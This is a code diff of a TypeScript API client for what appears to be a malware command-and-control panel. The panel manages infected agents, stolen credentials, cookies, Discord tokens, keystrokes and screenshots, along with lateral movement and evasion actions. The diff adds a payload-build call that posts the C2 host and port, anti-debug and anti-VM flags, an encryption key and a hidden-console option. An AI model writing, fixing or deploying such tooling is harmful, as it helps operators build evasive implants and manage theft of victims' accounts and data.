@@ -1,7 +1,25 @@
 import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module, PayloadConfig, BuildResult } from '@/types'
+import { normalizeAgent, normalizeAgents } from '@/lib/utils'
 
 const API_BASE = import.meta.env.VITE_API_BASE ?? (import.meta.env.DEV ? 'http://localhost:8080' : '')
-const WS_BASE = import.meta.env.VITE_WS_BASE ?? (import.meta.env.DEV ? 'ws://localhost:8081' : `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}`)
+function deriveWsBase(): string {
+  if (import.meta.env.VITE_WS_BASE) return import.meta.env.VITE_WS_BASE as string
+  if (API_BASE) {
+    try {
+      const u = new URL(API_BASE, typeof location !== 'undefined' ? location.href : 'http://localhost')
+      u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:'
+      return u.origin
+    } catch {
+      /* fall through */
+    }
+  }
+  if (import.meta.env.DEV) return 'ws://localhost:8081'
+  if (typeof location !== 'undefined') {
+    return `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}`
+  }
+  return ''
+}
+const WS_BASE = deriveWsBase()
 
 class ApiClient {
   private token: string | null = null
@@ -44,14 +62,17 @@ class ApiClient {
     })
 
     if (response.status === 401) {
-      this.setToken(null)
-      window.location.href = '/login'
-      throw new Error('Unauthorized')
+      if (!endpoint.includes('/auth/login')) {
+        this.setToken(null)
+        window.location.href = '/login'
+      }
+      const error = await response.json().catch(() => ({ error: 'Unauthorized', message: 'Unauthorized' }))
+      throw new Error(error.error || error.message || 'Unauthorized')
     }
 
     if (!response.ok) {
       const error = await response.json().catch(() => ({ message: 'Request failed' }))
-      throw new Error(error.message || 'Request failed')
+      throw new Error(error.error || error.Error || error.message || 'Request failed')
     }
 
     return response.json()
@@ -67,6 +88,15 @@ class ApiClient {
     return result
   }
 
+  async logout(): Promise<void> {
+    try {
+      await this.request('/api/auth/logout', { method: 'POST' })
+    } catch {
+      /* ignore */
+    }
+    this.setToken(null)
+  }
+
   async register(username: string, password: string): Promise<{ token: string; user: { username: string } }> {
     const result = await this.request<{ token: string; user: { username: string } }>('/api/auth/register', {
       method: 'POST',
@@ -78,11 +108,13 @@ class ApiClient {
 
   // Agents
   async getAgents(): Promise<Agent[]> {
-    return this.request<Agent[]>('/api/agents')
+    const raw = await this.request<any>('/api/agents')
+    return normalizeAgents(raw)
   }
 
   async getAgent(id: string): Promise<Agent> {
-    return this.request<Agent>(`/api/agents/${id}`)
+    const raw = await this.request<any>(`/api/agents/${id}`)
+    return normalizeAgent(raw)
   }
 
   async deleteAgent(id: string): Promise<void> {
@@ -262,11 +294,41 @@ class ApiClient {
   }
 
   // Payload Building
-  async buildPayload(config: PayloadConfig): Promise<BuildResult> {
-    return this.request<BuildResult>('/api/payloads/build', {
+  async buildPayload(config: PayloadConfig, binary?: File | null): Promise<BuildResult> {
+    const token = this.getToken()
+    const form = new FormData()
+    if (binary) form.append('binary', binary)
+    form.append('c2_host', config.ServerHost)
+    form.append('c2_port', String(config.ServerPort))
+    form.append('use_tls', (config.UseTLS || config.ServerPort === 443) ? 'true' : 'false')
+    form.append('platform', config.Platform)
+    form.append('anti_debug', config.AntiDebug ? 'true' : 'false')
+    form.append('anti_vm', config.AntiVM ? 'true' : 'false')
+    form.append('key', config.EncryptionKey || '')
+    form.append('hide_console', 'true')
+    if (config.CustomConfig) form.append('custom_config', config.CustomConfig)
+
+    const headers: Record<string, string> = {}
+    if (token) headers['Authorization'] = `Bearer ${token}`
+
+    const response = await fetch(`${API_BASE}/api/payloads/build`, {
       method: 'POST',
-      body: JSON.stringify(config),
+      headers,
+      body: form,
     })
+    const raw = await response.json().catch(() => ({}))
+    if (!response.ok) {
+      throw new Error(raw.error || raw.Error || raw.message || 'Build failed')
+    }
+    return {
+      Success: Boolean(raw.Success ?? raw.success ?? raw.id),
+      BinaryPath: String(raw.BinaryPath ?? raw.url ?? ''),
+      BinaryName: String(raw.BinaryName ?? raw.filename ?? ''),
+      Size: Number(raw.Size ?? raw.size ?? 0),
+      Checksum: String(raw.Checksum ?? raw.checksum ?? ''),
+      Error: String(raw.Error ?? raw.error ?? ''),
+      DownloadB64: raw.DownloadB64 ? String(raw.DownloadB64) : undefined,
+    }
   }
 
   async uploadAgentBinary(file: File, platform: 'windows' | 'linux'): Promise<{ success: boolean; path: string }> {
